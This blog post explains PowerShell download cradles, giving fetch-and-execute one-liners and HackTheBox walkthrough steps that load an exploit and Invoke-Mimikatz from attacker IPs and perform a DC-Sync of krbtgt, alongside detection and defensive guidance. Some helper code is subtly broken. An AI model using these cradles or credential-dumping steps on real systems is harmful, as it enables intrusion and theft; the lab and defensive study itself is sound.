+++
tags = ["Windows", "Active Directory", "PowerShell", "Download Cradle"]
draft = false
title = "Understanding PowerShell Download Cradles: A Deep Dive"
author = "bloodstiller"
date = 2024-11-11
+++

## Introduction {#introduction}

PowerShell has revolutionized system administration and automation. One of its powerful yet often misunderstood features is the PowerShell download cradle. This article explores what download cradles are, their uses, and best practices for implementation.


## What is a PowerShell Download Cradle? {#what-is-a-powershell-download-cradle}

A PowerShell download cradle is a technique that enables downloading and executing code directly in memory without writing to disk. This approach can help bypass security mechanisms while providing efficient code execution capabilities.


## Core Components and Techniques {#core-components-and-techniques}


### Essential Cmdlets {#essential-cmdlets}

-   `Invoke-WebRequest`: Retrieves content from web pages
-   `Invoke-Expression` (alias: IEX): Executes PowerShell commands from strings
-   `System.Net.WebClient`: .NET class for web server interactions


### Basic Syntax Example {#basic-syntax-example}

```powershell
powershell.exe -NoP -C "IEX(New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')"
```


## Common Download Cradle Examples {#common-download-cradle-examples}


### Basic WebClient Method {#basic-webclient-method}

```powershell
# Standard WebClient download cradle
IEX (New-Object Net.Webclient).downloadstring("https://example.com/script.ps1")

# PowerShell 3.0+ using Invoke-WebRequest (alias: iwr)
IEX (iwr 'https://example.com/script.ps1')
```


### COM Object Methods {#com-object-methods}

```powershell
# Internet Explorer COM object
$ie = New-Object -comobject InternetExplorer.Application
$ie.visible = $False
$ie.navigate('https://example.com/script.ps1')
start-sleep -s 5
$r = $ie.Document.body.innerHTML
$ie.quit()
IEX $r

# Msxml2.XMLHTTP COM object (proxy-aware)
$h = New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET','https://example.com/script.ps1',$false)
$h.send()
iex $h.responseText
```


### Advanced Techniques {#advanced-techniques}

```powershell
# DNS TXT Record Method
IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(
    ((nslookup -querytype=txt "example.com" | Select -Pattern '"*"') -split '"'[0])
)))

# XML Document Method
$a = New-Object System.Xml.XmlDocument
$a.Load("https://example.com/command.xml")
$a.command.a.execute | iex
```


## Implementation Guide {#implementation-guide}


### Basic Setup {#basic-setup}

1.  Launch PowerShell with appropriate privileges
2.  Configure execution policy if needed
    ```powershell
       Set-ExecutionPolicy RemoteSigned
    ```


### Creating a Secure Download Cradle {#creating-a-secure-download-cradle}

When implementing download cradles in a production environment, it's crucial to include proper error handling, logging, and security checks. The following example demonstrates a more robust implementation for in-memory execution:

```powershell
function Invoke-SecureDownloadCradle {
    param (
        [Parameter(Mandatory=$true)][string] $Url,
        [Parameter(Mandatory=$false)][string] $UserAgent = "PowerShell/SecurityAudit",
        [Parameter(Mandatory=$false)][int] $Timeout = 30000
    )

    try {
        # Configure WebClient with security in mind
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", $UserAgent)

        # Enforce TLS 1.2
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

        # Download and execute in memory
        $scriptContent = $webClient.DownloadString($Url)

        # Optional: Verify script signature or content
        if (Test-ScriptSignature $scriptContent) {
            $ExecutionContext.InvokeCommand.InvokeScript($false, [scriptblock]::Create($scriptContent), $null, $null)
        } else {
            throw "Script signature validation failed"
        }

    } catch {
        Write-Error "Download cradle execution failed: $_"
    } finally {
        $webClient.Dispose()
    }
}
```

This implementation includes several important security features:

-   Parameter validation for the URL and optional parameters
-   TLS 1.2 enforcement
-   Custom User-Agent support for tracking/auditing
-   Structured error handling with `try/catch` blocks
-   Script signature verification
-   Proper cleanup with `Dispose()`
-   Pure in-memory execution without touching disk

Example usage:

```powershell
# Basic usage
Invoke-SecureDownloadCradle -Url "https://internal.repo/scripts/diagnostic.ps1"

# With custom User-Agent and timeout
Invoke-SecureDownloadCradle -Url "https://internal.repo/scripts/update.ps1" `
    -UserAgent "CompanyName/UpdateService" `
    -Timeout 60000
```


## Real-World Examples from HackTheBox {#real-world-examples-from-hackthebox}


### Monteverde Machine: Running Remote Exploits {#monteverde-machine-running-remote-exploits}

In this example, we used a download cradle to execute AdConnect exploitation directly in memory:

```powershell
iex(new-object net.webclient).downloadstring('http://10.10.14.46:9000/AdConnectPOC.ps1')
```

-   {{< figure src="/ox-hugo/2024-10-14-131101_.png" >}}
-   As the exploit is run in memory we get the administrators password without writing to disk.


### Certified Box: Advanced Mimikatz Usage {#certified-box-advanced-mimikatz-usage}

-   Note this is not a spoiler as this is done post exploitation.


#### Setting Up the Environment {#setting-up-the-environment}

1.  Start a Python HTTP server to host the Mimikatz script:
    ```bash
       python3 -m http.server 9000
    ```


#### Loading Mimikatz into Memory {#loading-mimikatz-into-memory}

Using a download cradle to load [invoke-mimikatz](https://github.com/g4uss47/Invoke-Mimikatz) directly into memory:

```powershell
iex(new-object net.webclient).downloadstring('http://10.10.14.24:9000/Invoke-Mimikatz.ps1')
```

-   {{< figure src="/ox-hugo/2024-11-10-134628_.png" >}}
-   +Note+: This will hang for a little bit, so just be patient.


#### Performing DC-Sync Attack {#performing-dc-sync-attack}

```powershell
Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /user:krbtgt /domain:administrator.htb"'
```

-   {{< figure src="/ox-hugo/2024-11-10-135022_.png" >}}


## Security Considerations {#security-considerations}


### Detection Methods {#detection-methods}

Modern security solutions detect download cradles through several means:

-   PowerShell logging and ScriptBlock logging
-   Network traffic analysis (especially `.DownloadString` patterns)
-   AMSI integration in PowerShell 5.0+
-   EDR behavioral analysis
-   Memory scanning for known patterns


### Common Restrictions {#common-restrictions}

Organizations often implement:

```powershell
# Execution Policy
Set-ExecutionPolicy Restricted

# AMSI Scanning
# Built into PowerShell 5.0+ by default

# AppLocker Rules
# Block PowerShell download cradle patterns
New-AppLockerPolicy -RuleType Path -Deny -Path "%SYSTEM32%\WindowsPowerShell\*\powershell.exe" -User Everyone
```


### Defensive Recommendations {#defensive-recommendations}

**For system administrators**:

1.  **Enable PowerShell logging**:
    ```powershell
       # Enable detailed script block logging
       Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
    ```

2.  **Monitor for suspicious patterns**:
    -   Direct execution using `IEX`
    -   Base64 encoded commands
    -   Uncommon COM objects
    -   Unusual DNS TXT queries

3.  **Network Controls**:
    -   Implement HTTPS inspection
    -   Block outbound PowerShell connections
    -   Monitor for unusual PowerShell network activity


### Legitimate Use Cases {#legitimate-use-cases}

-   Download cradles aren't just for security testing - they're valuable tools for system administrators and developers in enterprise environments. Here are some common legitimate scenarios:


#### Configuration Management {#configuration-management}

Configuration management requires frequent updates across multiple systems. Using download cradles ensures all systems stay in sync with the central repository.

```powershell
# Example: Downloading and applying configuration from internal repository
$config = Invoke-WebRequest -Uri "https://internal.repo/configs/web-server.json"
Set-ServerConfiguration -InputObject ($config.Content | ConvertFrom-Json)
```


#### Automated Patching {#automated-patching}

Automated patch management is crucial for maintaining system security. This example shows how to safely download and track patch installations.

```powershell
# Example: Downloading and applying patches from approved source
$patches = Get-PatchList -Environment "Production"
foreach ($patch in $patches) {
    Start-BitsTransfer -Source $patch.Uri -Destination "C:\Updates"
    # Implement verification and logging
    Write-Log "Downloaded patch: $($patch.Name)"
}
```


#### Remote Diagnostics {#remote-diagnostics}

When troubleshooting remote systems, being able to run diagnostic scripts directly from a central repository saves time and ensures consistency.

```powershell
# Example: Running diagnostic scripts from central repository
$diagnostic = Invoke-WebRequest -Uri "https://tools.internal/diagnostics/memory-check.ps1" `
    -Headers @{"Authorization" = "Bearer $token"} `
    -UseDefaultCredentials
if (Test-ScriptSignature $diagnostic.Content) {
    Invoke-Expression $diagnostic.Content
}
```


## Best Practices {#best-practices}

Implementing download cradles securely requires attention to several key areas. Here's a comprehensive guide to best practices:


### Code Implementation {#code-implementation}


#### Error Handling {#error-handling}

Robust error handling is crucial for production environments. This example shows how to handle common failure scenarios while maintaining security.

```powershell
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Corporate-Updater/1.0")
    $webClient.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
    $webClient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

    # Implement timeout
    $webClient.Timeout = 30000 # 30 seconds

    # Download with certificate validation
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
    $script = $webClient.DownloadString($url)

    # Verify signature before execution
    if (Test-ScriptSignature $script) {
        Invoke-Expression $script
    }
} catch [System.Net.WebException] {
    Write-Error "Network error: $($_.Exception.Message)"
} catch {
    Write-Error "Unexpected error: $_"
} finally {
    $webClient.Dispose()
}
```


#### Logging and Monitoring {#logging-and-monitoring}

Proper logging is essential for troubleshooting and audit trails. This implementation provides detailed logging of all download operations.

```powershell
function Start-ScriptDownload {
    param($Uri)

    $EventParams = @{
        LogName = 'Application'
        Source = 'ScriptDownloader'
        EventId = 1000
        EntryType = 'Information'
    }

    Write-EventLog @EventParams -Message "Starting download from: $Uri"
    # Implement download logic
    Write-EventLog @EventParams -Message "Download completed: $Uri"
}
```


### Security Measures {#security-measures}


#### Certificate Validation {#certificate-validation}

Always validate certificates to prevent man-in-the-middle attacks. These settings ensure proper TLS configuration.

```powershell
# Ensure proper certificate validation
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
```


#### Hash Verification {#hash-verification}

Verify file integrity using hash checks. This function provides a reusable way to validate downloaded content.

```powershell
function Test-FileHash {
    param(
        [string]$FilePath,
        [string]$ExpectedHash
    )

    $actualHash = Get-FileHash -Path $FilePath -Algorithm SHA256
    return $actualHash.Hash -eq $ExpectedHash
}
```


### Operational Guidelines {#operational-guidelines}

Following these guidelines ensures your download cradles remain secure and maintainable over time:

1.  **Source Control**
    -   Maintain scripts in version control
    -   Use approved internal repositories
    -   Implement change management procedures

2.  **Documentation**
    -   Document all implemented download cradles
    -   Maintain usage logs
    -   Keep deployment documentation updated

3.  **Testing**
    -   Test in development environment first
    -   Verify behavior with security tools enabled
    -   Validate against current security policies

4.  **Maintenance**
    -   Regular review of implemented cradles
    -   Update security certificates
    -   Monitor for deprecated methods
